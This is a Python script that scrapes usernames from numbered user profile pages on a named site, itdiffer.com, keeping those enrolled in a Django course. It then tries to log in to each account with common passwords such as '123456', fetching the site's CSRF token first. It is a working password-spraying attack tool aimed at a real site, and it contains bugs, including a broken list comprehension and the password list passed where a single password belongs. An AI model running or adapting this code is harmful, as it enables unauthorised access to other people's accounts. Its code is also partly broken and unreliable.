#coding:utf-8
import requests
import re
from lxml import html
from bs4 import BeautifulSoup as bs
import Queue
import time
import threading


queue = Queue.Queue()

def login(admin,password):
    s = requests.Session()
    login_url = 'http://www.itdiffer.com/login'
    post_url = 'http://www.itdiffer.com/login_check'
    content = s.get(login_url)
    pattern = re.compile('name="_csrf_token" value="(.*?)"')
    tokens = re.findall(pattern,content.text)
    token = tokens[0]
    data = {
        '_username':admin,
        '_password':password,
        '_csrf_token':token,
        '_target_path':'http://www.itdiffer.com/'
    }
    print(data)
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
               'Host':'www.itdiffer.com',
               'Cache-Control':'max-age=0',
               'Origin':'http://www.itdiffer.com',
               'Upgrade-Insecure-Requests':'1',
               'Content-Type':'application/x-www-form-urlencoded',
               'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Referer':'ttp://www.itdiffer.com/login',
               'Accept-Encoding':'gzip, deflate',
               'Accept-Language':'zh-CN,zh;q=0.8'
               }
    response = s.post(url=post_url,data=data,headers=headers)
    print(response.status_code)

    open_url = 'http://www.itdiffer.com/my/courses/learning'
    tags = '我的课程'
    html = s.get(open_url)
    #print(html.status_code)
    #print(html.content)
    #print(html.content)
    if re.findall(tags,html.content):
        print('login success')
    else:
        print('failed')
def get_all_names():

	for i in range(4,700):
		url = 'http://www.itdiffer.com/user/{}'.format(i)
		queue.put(url)

class GetNames(threading.Thread):
	def __init__(self,queue):
		threading.Thread.__init__(self)
		self.queue = queue
	def run(self):
		while True:
			if self.queue.empty():
				break

			try:
				data = self.queue.get_nowait()
				self.get_name_from_html(data)
			except Exception as e:
				raise e


	def get_name_from_html(self,url):
		#all_names = []
		try:
			pattern = 'Django多用户网站系统开发'
			contents = requests.get(url)
			if re.findall(pattern,contents.content):
				soup = bs(contents.content,'lxml')
				name = soup.select('div.name')
				for i in name:
					#print(i.get_text().strip())
					#all_names.append(i.get_text().strip())
					final_name = i.get_text().strip()
					with open('name.txt','a+') as f:
						f.writelines(final_name+'\n')

			else:
				pass

		except Exception as e:
			raise e
		


get_all_names()
threads = []
threadNum = 20
for i in range(threadNum):
	threads.append(GetNames(queue))
for t in threads:
	t.start()
for t in threads:
	t.join()

print('task done')

passwords = ['123456','12345678','Abc123456']
with open('name.txt','r') as files:
	names = [for line in files.readlines()]
for name in names:	
	for password in passwords:
		login(name,passwords)
